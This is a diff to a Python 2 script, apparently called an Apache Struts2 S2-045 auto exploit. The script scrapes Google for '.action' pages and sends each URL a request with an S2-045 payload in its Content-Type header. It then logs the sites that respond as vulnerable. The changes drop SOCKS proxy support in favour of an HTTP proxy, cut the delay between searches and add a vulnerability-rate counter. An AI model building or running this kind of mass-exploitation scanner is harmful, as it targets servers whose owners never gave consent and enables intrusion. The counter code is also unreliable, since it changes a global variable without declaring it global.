@@ -1,7 +1,8 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 #
-# Struts2-S2-045 auto exploit throw google search results crawler
+# Apache Struts2 S2-045 auto exploit
+# with google search results crawler
 #
 
 import sys, os
@@ -9,7 +10,8 @@ import Queue
 import threading
 import StringIO
 import ConfigParser
-import socket, socks
+import socket
+import urllib2
 import time, signal, gzip
 import re, random, types
 from bs4 import BeautifulSoup
@@ -18,22 +20,16 @@ from atexit import register
 
 cp = ConfigParser.SafeConfigParser()
 cp.read('crawler.conf')
+http_proxy = {}
 if cp.has_option('http', 'http_addr') and cp.has_option('http', 'http_port'):
     http_proxy = {
-        'host': cp.get('socks5', 'proxy_addr'),
-        'port': int(cp.get('socks5', 'proxy_port'))
+        'host': cp.get('http', 'http_addr'),
+        'port': int(cp.get('http', 'http_port'))
     }
-elif cp.has_option('socks', 'socks_addr') and cp.has_option('socks', 'socks_port'):
-    proxy_addr = cp.get('socks5', 'proxy_addr')
-    proxy_port = int(cp.get('socks5', 'proxy_port'))
-    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_addr, proxy_port)
-    socket.socket = socks.socksocket
-import urllib2
-
-
 base_url = cp.get('crawler', 'base_url')
 results_per_page = 10
 user_agents = []
+vuln_num = 0
 url_set = set()
 url_queue = Queue.Queue()
 vuln_queue = Queue.Queue()
@@ -65,7 +61,7 @@ class GoogleAPI:
 
     def random_sleep(self):
         # sleeptime = random.randint(60, 120)
-        sleeptime = random.randint(10, 30)
+        sleeptime = random.randint(1, 10)
         time.sleep(sleeptime)
 
     # extract a url from a link
@@ -100,7 +96,7 @@ class GoogleAPI:
                     if url in url_set:
                         continue
                     with lock:
-                        print '\033[0;32m[*] [URL]\033[0m', url
+                        print '\033[0;32m[*] [URL] %s\033[0m' % url
                     url_queue.put(url)
                     url_set.add(url)
 
@@ -166,10 +162,11 @@ def crawler():
     api = GoogleAPI()
 
     # set expect search results to be crawled
-    expect_num = 100
+    expect_num = int(cp.get('crawler', 'expect_num'))
     # if no parameters, read query keywords from file
     if len(sys.argv) < 2:
-        keyword = cp.get('crawler', 'keyword')
+        # keyword = cp.get('crawler', 'keyword')
+        keyword = 'ext:action'
         api.search(keyword, num=expect_num)
     else:
         keyword = sys.argv[1]
@@ -189,7 +186,7 @@ def poccheck(timeout):
     while True:
         url = url_queue.get()
         with lock:
-            print '\033[0;32m[*] testing %s\033[0m' % url
+            print '\033[0;32m[*] [POC] %s\033[0m' % url
         request = urllib2.Request(url)
         request.add_header("Content-Type", S2_045["poc"])
         request.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0")
@@ -197,16 +194,13 @@ def poccheck(timeout):
             res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
         except Exception, e:
             with lock:
-                print ''
                 print '\033[0;31m[!] [POC_ERROR]\033[0m', e
-                print ''
         else:
             if S2_045['key'] in res_html:
                 with lock:
-                    print ''
                     print '\033[1;32m[*] [VULNERABLE]\033[0m', url
-                    print ''
                     vuln_queue.put(url)
+                    vuln_num += 1
                     with open('./vulnerable.txt', 'w') as vulnerable:
                         vulnerable.write(url+'\n')
 
@@ -228,17 +222,21 @@ def banner():
 
 @register
 def atexit():
-    if vuln_queue.empty():
+    if vuln_num == 0:
         print '\033[1;33m\r[*] no vulnerable url have found\033[0m'
-    print ''
+    else:
+        url_num = len(url_set)
+        vuln_rate = (vuln_num / float(url_num)) * 100
+        print '\033[1;33m\r[*] %d url are vulnerable in %d (%d%%)\033[0m' % (vuln_num, url_num, vuln_rate)
+    print '\r  '
     print '[*] shutting down at', time.strftime("%H:%M:%S")
     print ''
 
 
 def main():
     banner()
-    if proxy_addr and proxy_port:
-        print '[*] [PROXY] %s:%d' % (proxy_addr, proxy_port)
+    if http_proxy:
+        print '[*] [PROXY] %(host)s:%(port)d' % http_proxy
     print ''
     print '[*] starting at', time.strftime("%H:%M:%S")
     print ''
